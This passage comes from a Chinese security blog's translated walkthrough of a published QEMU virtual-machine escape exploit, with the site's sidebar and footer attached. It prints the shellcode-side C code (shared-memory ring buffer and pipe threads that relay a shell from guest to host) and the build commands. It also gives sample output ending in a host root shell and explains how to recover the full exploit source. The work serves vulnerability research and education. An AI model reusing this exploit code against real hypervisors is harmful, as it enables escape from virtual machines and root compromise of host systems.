+<p>shellcode()函数之后调用madvise()函数这是撤销shared_data-&gt;addr pointing的MADV_DONTFORK标志，这可以确保fork之后内存映射还是可用的。</p>
+<p>shellcode()函数接下来是创建了一个子进程——就是启动一个shell(“/bin/sh”)。父进程则启动了3个线程，到共享内存区域将shell命令从guest虚拟机传递到host主机，之后将这些命令执行结果的输出给回guest虚拟机。父进程与子进程的通信则通过管道来通信。</p>
+<p>如下所示，共享内存区域包含一个环形缓冲区，可以通过sm_read() 和 sm_write()原语进行访问。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">struct shared_ring_buf &#123;</span><br><span class="line">	volatile bool lock;</span><br><span class="line">	bool          empty;</span><br><span class="line">	uint8_t       head;</span><br><span class="line">	uint8_t       tail;</span><br><span class="line">	uint8_t       buf[SHARED_BUFFER_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">static inline</span><br><span class="line">__attribute__((always_inline))</span><br><span class="line">ssize_t sm_read(struct GOT *got, struct shared_ring_buf *ring,</span><br><span class="line">                char *out, ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">	ssize_t read = 0, available = 0;</span><br><span class="line"></span><br><span class="line">	do &#123;</span><br><span class="line">		/* spin lock */</span><br><span class="line">		while (__atomic_test_and_set(&amp;ring-&gt;lock, __ATOMIC_RELAXED));</span><br><span class="line"></span><br><span class="line">		if (ring-&gt;head &gt; ring-&gt;tail) &#123; // loop on ring</span><br><span class="line">			available = SHARED_BUFFER_SIZE - ring-&gt;head;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			available = ring-&gt;tail - ring-&gt;head;</span><br><span class="line">			if (available == 0 &amp;&amp; !ring-&gt;empty) &#123;</span><br><span class="line">				available = SHARED_BUFFER_SIZE - ring-&gt;head;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		available = MIN(len - read, available);</span><br><span class="line"></span><br><span class="line">		imemcpy(out, ring-&gt;buf + ring-&gt;head, available);</span><br><span class="line">		read += available;</span><br><span class="line">		out += available;</span><br><span class="line">		ring-&gt;head += available;</span><br><span class="line"></span><br><span class="line">		if (ring-&gt;head == SHARED_BUFFER_SIZE)</span><br><span class="line">			ring-&gt;head = 0;</span><br><span class="line"></span><br><span class="line">		if (available != 0 &amp;&amp; ring-&gt;head == ring-&gt;tail)</span><br><span class="line">			ring-&gt;empty = true;</span><br><span class="line"></span><br><span class="line">		__atomic_clear(&amp;ring-&gt;lock, __ATOMIC_RELAXED);</span><br><span class="line">	&#125; while (available != 0 || read == 0);</span><br><span class="line"></span><br><span class="line">	return read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static inline</span><br><span class="line">__attribute__((always_inline))</span><br><span class="line">ssize_t sm_write(struct GOT *got, struct shared_ring_buf *ring,</span><br><span class="line">                 char *in, ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">	ssize_t written = 0, available = 0;</span><br><span class="line"></span><br><span class="line">	do &#123;</span><br><span class="line">		/* spin lock */</span><br><span class="line">		while (__atomic_test_and_set(&amp;ring-&gt;lock, __ATOMIC_RELAXED));</span><br><span class="line"></span><br><span class="line">		if (ring-&gt;tail &gt; ring-&gt;head) &#123; // loop on ring</span><br><span class="line">			available = SHARED_BUFFER_SIZE - ring-&gt;tail;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			available = ring-&gt;head - ring-&gt;tail;</span><br><span class="line">			if (available == 0 &amp;&amp; ring-&gt;empty) &#123;</span><br><span class="line">				available = SHARED_BUFFER_SIZE - ring-&gt;tail;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		available = MIN(len - written, available);</span><br><span class="line"></span><br><span class="line">		imemcpy(ring-&gt;buf + ring-&gt;tail, in, available);</span><br><span class="line">		written += available;</span><br><span class="line">		in += available;</span><br><span class="line">		ring-&gt;tail += available;</span><br><span class="line"></span><br><span class="line">		if (ring-&gt;tail == SHARED_BUFFER_SIZE)</span><br><span class="line">			ring-&gt;tail = 0;</span><br><span class="line"></span><br><span class="line">		if (available != 0)</span><br><span class="line">			ring-&gt;empty = false;</span><br><span class="line"></span><br><span class="line">		__atomic_clear(&amp;ring-&gt;lock, __ATOMIC_RELAXED);</span><br><span class="line">	&#125; while (written != len);</span><br><span class="line"></span><br><span class="line">	return written;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的两个原语是由下面的线程函数使用的。第一个是从共享内存区域读取数据，然后写到一个文件描述符中。第二个的话是从文件描述符中读取，然后写到共享内存区域</p>
+<p>These primitives are used by the following threads function. The first one<br>reads data from a shared memory area and writes it to a file descriptor.<br>The second one reads data from a file descriptor and writes it to a shared<br>memory area.  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">void *pipe_r2fd(void *_brwpipe)</span><br><span class="line">&#123;</span><br><span class="line">	struct brwpipe *brwpipe = (struct brwpipe *)_brwpipe;</span><br><span class="line">	char buf[SHARED_BUFFER_SIZE];</span><br><span class="line">	ssize_t len;</span><br><span class="line"></span><br><span class="line">	while (true) &#123;</span><br><span class="line">		len = sm_read(brwpipe-&gt;got, brwpipe-&gt;ring, buf, sizeof(buf));</span><br><span class="line">		if (len &gt; 0)</span><br><span class="line">			brwpipe-&gt;got-&gt;write(brwpipe-&gt;fd, buf, len);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return NULL;</span><br><span class="line">&#125; SHELLCODE(pipe_r2fd)</span><br><span class="line"></span><br><span class="line">void *pipe_fd2r(void *_brwpipe)</span><br><span class="line">&#123;</span><br><span class="line">	struct brwpipe *brwpipe = (struct brwpipe *)_brwpipe;</span><br><span class="line">	char buf[SHARED_BUFFER_SIZE];</span><br><span class="line">	ssize_t len;</span><br><span class="line"></span><br><span class="line">	while (true) &#123;</span><br><span class="line">		len = brwpipe-&gt;got-&gt;read(brwpipe-&gt;fd, buf, sizeof(buf));</span><br><span class="line">		if (len &lt; 0) &#123;</span><br><span class="line">			return NULL;</span><br><span class="line">		&#125; else if (len &gt; 0) &#123;</span><br><span class="line">			len = sm_write(brwpipe-&gt;got, brwpipe-&gt;ring, buf, len);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意代码里面的这些函数是共享于host主机和guest虚拟机。这些线程也在guest虚拟机实例化，读取用户输入的命令，之后复制他们专用的共享内存区域（in这个变量的共享内存区域）。还有将命令的输出写到共享内存区域（out和err这两个变量共享内存）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">void session(struct shared_io *shared_io)</span><br><span class="line">&#123;</span><br><span class="line">	size_t len;</span><br><span class="line">	pthread_t t_in, t_out, t_err;</span><br><span class="line">	struct GOT got;</span><br><span class="line">	struct brwpipe *in, *out, *err;</span><br><span class="line"></span><br><span class="line">	got.read = &amp;read;</span><br><span class="line">	got.write = &amp;write;</span><br><span class="line"></span><br><span class="line">	warnx(&quot;[!] enjoy your shell&quot;);</span><br><span class="line">	fputs(COLOR_SHELL, stderr);</span><br><span class="line"></span><br><span class="line">	in = malloc(sizeof(struct brwpipe));</span><br><span class="line">	out = malloc(sizeof(struct brwpipe));</span><br><span class="line">	err = malloc(sizeof(struct brwpipe));</span><br><span class="line"></span><br><span class="line">	in-&gt;got = &amp;got;</span><br><span class="line">	out-&gt;got = &amp;got;</span><br><span class="line">	err-&gt;got = &amp;got;</span><br><span class="line"></span><br><span class="line">	in-&gt;fd = STDIN_FILENO;</span><br><span class="line">	out-&gt;fd = STDOUT_FILENO;</span><br><span class="line">	err-&gt;fd = STDERR_FILENO;</span><br><span class="line"></span><br><span class="line">	in-&gt;ring = &amp;shared_io-&gt;in;</span><br><span class="line">	out-&gt;ring = &amp;shared_io-&gt;out;</span><br><span class="line">	err-&gt;ring = &amp;shared_io-&gt;err;</span><br><span class="line"></span><br><span class="line">	pthread_create(&amp;t_in, NULL, pipe_fd2r, in);</span><br><span class="line">	pthread_create(&amp;t_out, NULL, pipe_r2fd, out);</span><br><span class="line">	pthread_create(&amp;t_err, NULL, pipe_r2fd, err);</span><br><span class="line"></span><br><span class="line">	pthread_join(t_in, NULL);</span><br><span class="line">	pthread_join(t_out, NULL);</span><br><span class="line">	pthread_join(t_err, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面我们讨论说明了共享内存，在guest和host里面运行的进程/线程。</p>
+<p>这个exploit作者使用了gcc 4.9.2进行编译。未来适应特定的qemu，作者提供了一个shell脚本（build-exploit.sh）来输出一个qemu.h头文件，其实获得的是各种我们需要的函数什么的偏移。</p>
+<p>使用方法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./build-exploit &lt;path-to-qemu-binary&gt; &gt; qemu.h</span><br></pre></td></tr></table></figure>
+
+<p>编译直接-o会出错，得加个-pthread</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc vm-escape.c -pthread -o vm-escape</span><br></pre></td></tr></table></figure>
+
+<p>Running the full exploit (vm-escape.c) will result in the following output:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ./vm-escape</span><br><span class="line">$ exploit: [+] found 190 potential ObjectProperty structs in memory </span><br><span class="line">$ exploit: [+] .text mapped at 0x7fb6c55c3620</span><br><span class="line">$ exploit: [+] mprotect mapped at 0x7fb6c55c0f10</span><br><span class="line">$ exploit: [+] qemu_set_irq mapped at 0x7fb6c5795347</span><br><span class="line">$ exploit: [+] VM physical memory mapped at 0x7fb630000000</span><br><span class="line">$ exploit: [+] payload at 0x7fb6a8913000</span><br><span class="line">$ exploit: [+] patching packet ...</span><br><span class="line">$ exploit: [+] running first attack stage</span><br><span class="line">$ exploit: [+] running shellcode at 0x7fb6a89132d0</span><br><span class="line">$ exploit: [!] enjoy your shell</span><br><span class="line">$ shell &gt; id</span><br><span class="line">$ uid=0(root) gid=0(root) ...</span><br></pre></td></tr></table></figure>
+
+<p>由于我的实验环境的内核编译的时候应该没有加入CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE这个选项，所以irq指针是在qemu的堆里面，而不在qemu给guest所mmap出来的内存里面，而我们又只能溢出4个字节，所以只能失败</p>
+<p><img src="http://pic.giantbranch.cn/pic/1563348038846.jpg" alt></p>
+<h1 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h1><p>请注意，目前的漏洞利用仍然是不可靠的。在测试环境中（Debian 7 running a 3.16 kernel on x_86_64 arch），10次中大概有1次是失败的。在大多数失败的情况中，exp不能重构qemu的内存布局，因为泄露的数据是不可用的（其实就是泄露的数据不靠谱，导致计算出的其他函数的地址是错误的）</p>
+<p>同样exploit也不适用于内核编译没有加入CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE标志的。这种情况下，qemu二进制程序（默认加入-fPIE进行编译）会映射到单独的内存地址空间中，如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">55e5e3fdd000-55e5e4594000 r-xp 00000000 fe:01 6940407   [qemu-system-x86_64]</span><br><span class="line">55e5e4794000-55e5e4862000 r--p 005b7000 fe:01 6940407           ...</span><br><span class="line">55e5e4862000-55e5e48e3000 rw-p 00685000 fe:01 6940407           ...</span><br><span class="line">55e5e48e3000-55e5e4d71000 rw-p 00000000 00:00 0 </span><br><span class="line">55e5e6156000-55e5e7931000 rw-p 00000000 00:00 0         [heap]</span><br><span class="line"></span><br><span class="line">7fb80b4f5000-7fb80c000000 rw-p 00000000 00:00 0 </span><br><span class="line">7fb80c000000-7fb88c000000 rw-p 00000000 00:00 0         [2 GB of RAM] </span><br><span class="line">7fb88c000000-7fb88c915000 rw-p 00000000 00:00 0 </span><br><span class="line">                     ...</span><br><span class="line">7fb89b6a0000-7fb89b6cb000 r-xp 00000000 fe:01 794385    [first shared lib]</span><br><span class="line">7fb89b6cb000-7fb89b8cb000 ---p 0002b000 fe:01 794385            ...</span><br><span class="line">7fb89b8cb000-7fb89b8cc000 r--p 0002b000 fe:01 794385            ...</span><br><span class="line">7fb89b8cc000-7fb89b8cd000 rw-p 0002c000 fe:01 794385            ...</span><br><span class="line">                     ...</span><br><span class="line">7ffd8f8f8000-7ffd8f91a000 rw-p 00000000 00:00 0         [stack]</span><br><span class="line">7ffd8f970000-7ffd8f972000 r--p 00000000 00:00 0         [vvar]</span><br><span class="line">7ffd8f972000-7ffd8f974000 r-xp 00000000 00:00 0         [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们的4字节溢出不足以覆盖irq指针（因为地址在0x55xxxxxxxxxx处的堆中）指向我们假的IRQState结构，而IRQState结构在0x7fxxxxxxxxxx</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在本文中，我们展示了QEMU的网络设备模拟器的两个漏洞。 这些漏洞利用的结合使得突破VM并在主机上执行代码成为可能。</p>
+<p>在这项工作中，我们可能会crash我们的测试VM1000次。 调试不成功的漏洞利用会很繁琐，特别是，使用复杂的shellcode函数去多进程，而一个进程又启动多个线程。因此，我们希望已经提供了足够的技术细节以及可以重复用于进一步利用QEMU的通用技术。</p>
+<h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>原作者的感谢的话我就不贴出来了</p>
+<h1 id="实验源码"><a href="#实验源码" class="headerlink" title="实验源码"></a>实验源码</h1><p>下面文章的Source Code部分有uuencode编码的内容，将begin…end之间拷贝到一个文件——命名为666.txt(你喜欢什么名字都可以)</p>
+<p>执行命令</p>
+<p>uudecode 666.txt</p>
+<p>就得到vm_escape.tar.gz，再解压就可以了</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="noopener">http://phrack.org/papers/vm-escape-qemu-case-study.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2019/07/17/VM escape 之 QEMU Case Study/" title="VM escape 之 QEMU Case Study">https://www.giantbranch.cn/2019/07/17/VM escape 之 QEMU Case Study/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/qemu/" rel="tag"># qemu</a>
+          
+            <a href="/tags/vm-escape/" rel="tag"># vm escape</a>
+          
+            <a href="/tags/虚拟机逃逸/" rel="tag"># 虚拟机逃逸</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/20/路由器0day漏洞挖掘实战/" rel="next" title="路由器0day漏洞挖掘实战">
+                <i class="fa fa-chevron-left"></i> 路由器0day漏洞挖掘实战
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/07/在ubuntu 18.04上编译VirtualBox/" rel="prev" title="在ubuntu 18.04上编译VirtualBox">
+                在ubuntu 18.04上编译VirtualBox <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#KVM-QEMU-总览"><span class="nav-number">2.</span> <span class="nav-text">KVM/QEMU 总览</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU内存布局"><span class="nav-number">2.2.</span> <span class="nav-text">QEMU内存布局</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#地址转换"><span class="nav-number">2.3.</span> <span class="nav-text">地址转换</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息泄露利用的实现"><span class="nav-number">3.</span> <span class="nav-text">信息泄露利用的实现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞代码"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置网卡"><span class="nav-number">3.2.</span> <span class="nav-text">配置网卡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#堆溢出的利用"><span class="nav-number">4.</span> <span class="nav-text">堆溢出的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞代码-1"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#设置网卡"><span class="nav-number">4.2.</span> <span class="nav-text">设置网卡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#逆向CRC"><span class="nav-number">4.3.</span> <span class="nav-text">逆向CRC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">4.4.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#将上面两个漏洞结合起来实现完整利用"><span class="nav-number">5.</span> <span class="nav-text">将上面两个漏洞结合起来实现完整利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#控制RIP"><span class="nav-number">5.1.</span> <span class="nav-text">控制RIP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#交互式shell"><span class="nav-number">5.2.</span> <span class="nav-text">交互式shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VM-Escape-Exploit"><span class="nav-number">5.3.</span> <span class="nav-text">VM-Escape Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#局限性"><span class="nav-number">6.</span> <span class="nav-text">局限性</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#感谢"><span class="nav-number">8.</span> <span class="nav-text">感谢</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验源码"><span class="nav-number">9.</span> <span class="nav-text">实验源码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">10.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
